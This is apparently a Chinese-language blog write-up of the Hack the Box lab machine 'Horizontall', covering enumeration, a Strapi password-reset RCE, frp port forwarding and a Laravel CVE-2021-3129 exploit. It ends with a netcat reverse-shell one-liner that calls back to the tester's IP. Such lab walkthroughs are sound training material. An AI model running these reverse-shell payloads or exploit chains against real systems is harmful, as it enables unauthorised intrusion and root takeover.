---
title: Horizontall
date: 2022-01-09 20:35:15
tags: Hack the Box
categories: CMS
---

## 信息收集
目标主机只开放了ssh和web服务
![在这里插入图片描述](https://img-blog.csdnimg.cn/c6ea98b32b994a8f8a0cf9c759db1cee.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16)
我们直接访问web服务，发现是一个正常的网页，扫描目录也没有发现有价值的信息

```bash
gobuster dir -u "http://horizontall.htb/" -w /usr/share/seclists/Discovery/Web-Content/common.txt -e 404,500 -t 50
```
![在这里插入图片描述](https://img-blog.csdnimg.cn/f6b30b44e96d409f934b299e104245eb.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16)

<!--more-->

那我们将注意力转移到子域名上，对子域名进行深入挖掘，发现了一个子域名，那么我们可以实施旁站注入

```bash
gobuster vhost -u http://horizontall.htb -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt -t 100
```
![在这里插入图片描述](https://img-blog.csdnimg.cn/2cf9c69827e84e87b9616816c817376d.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16)
访问这个页面时发现使用的是`strapi`这个CMS
![在这里插入图片描述](https://img-blog.csdnimg.cn/3724c08fac2d427f80427e762141b930.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16)

<!--more-->

我们依照这个路径进行路径的扫描，发现存在一个admin目录，我们访问发现会跳转到登录表单上

```bash
gobuster dir -u "http://api-prod.horizontall.htb/" -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -e 404,500 -t 50
```
![在这里插入图片描述](https://img-blog.csdnimg.cn/19c0c71aaef14180949dead326bc5c37.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16)
## 漏洞利用
尝试了一遍SQL注入，发现不存在SQL注入的问题。那我们转向中间件漏洞这个方向上，在EDB上查找到存在一个密码重置的RCE漏洞
![在这里插入图片描述](https://img-blog.csdnimg.cn/fd1458a74a574a918911ef0a1ae87cfe.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16)
![在这里插入图片描述](https://img-blog.csdnimg.cn/acf1f0e8aea34dacb917647d4ee1f190.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16)
我们编辑为一个exp文件，并执行它获取到一个用户交互的shell终端。这里显示用户名和密码是`admin:SuperStrongPassword1`
![在这里插入图片描述](https://img-blog.csdnimg.cn/d93aa5dc52404922aadb13f884d33ccf.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16)
登录进页面发现存在文件上传点，但是这个并不能进行文件上传getshell
![在这里插入图片描述](https://img-blog.csdnimg.cn/8b81cd2146e843a5941549c0bfe46564.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16)
我们发现这个EXP是存在RCE命令执行的功能的，那我们可以在交互终端上进行反弹一个shell给我们
![在这里插入图片描述](https://img-blog.csdnimg.cn/88522af59e4e42d2bd77c449691c2e62.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16)
## 提权
我们将linpeas.sh脚本下载到目标机器上，尝试看看有没有存在提权的突破点
![在这里插入图片描述](https://img-blog.csdnimg.cn/a7e43564181146d0b3e82efaac54674a.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16)
运行脚本后，但是我们并没有发现任何可提权的点，但是我们查看主机运行的端口可以发现，主机的1337端口正在以root身份运行程序，由于我们用nmap无法扫描出该端口，可以推断主机做了内网端口的转发。
![在这里插入图片描述](https://img-blog.csdnimg.cn/0638be03f2764c3f9db143944921a40f.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16)
我们可以使用frp进行内网的端口复用，首先先将`frpc`和`frpc.ini`上传到目标主机上，上传成功后设置好我们本机的ip地址和要转发本地端口和远程端口
![在这里插入图片描述](https://img-blog.csdnimg.cn/5b03de7f59a043c887497c243c893d3d.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16)
在目标机器和本机上分别开启监听服务
![在这里插入图片描述](https://img-blog.csdnimg.cn/28bf83b3599646c89714b357a407787f.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16)
然后我们访问本机的8000端口，发现是一个由Laravel框架搭建起来的网页程序
![在这里插入图片描述](https://img-blog.csdnimg.cn/8581ba2866b940708a56f715327a7152.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16)
这个应用程序近年发现一个存在RCE的漏洞，在github上可以搜到对应的EXP漏洞利用脚本，并执行可见漏洞利用成功
[https://github.com/LucifielHack/CVE-2021-3129_exploit](https://github.com/LucifielHack/CVE-2021-3129_exploit)
![在这里插入图片描述](https://img-blog.csdnimg.cn/e95aaf54fdb343a199cf7ec03bc27d52.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16)
那么我们可以反弹一个root的shell到本机上

```bash
./exploit.py http://localhost:8000 Monolog/RCE1 "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.25 4445 >/tmp/f"
```
![在这里插入图片描述](https://img-blog.csdnimg.cn/9d4a8f62eb834cb78ddc826a02de9132.png)
![在这里插入图片描述](https://img-blog.csdnimg.cn/db008ce7bfb14ce78f99c0d2534651e1.png)
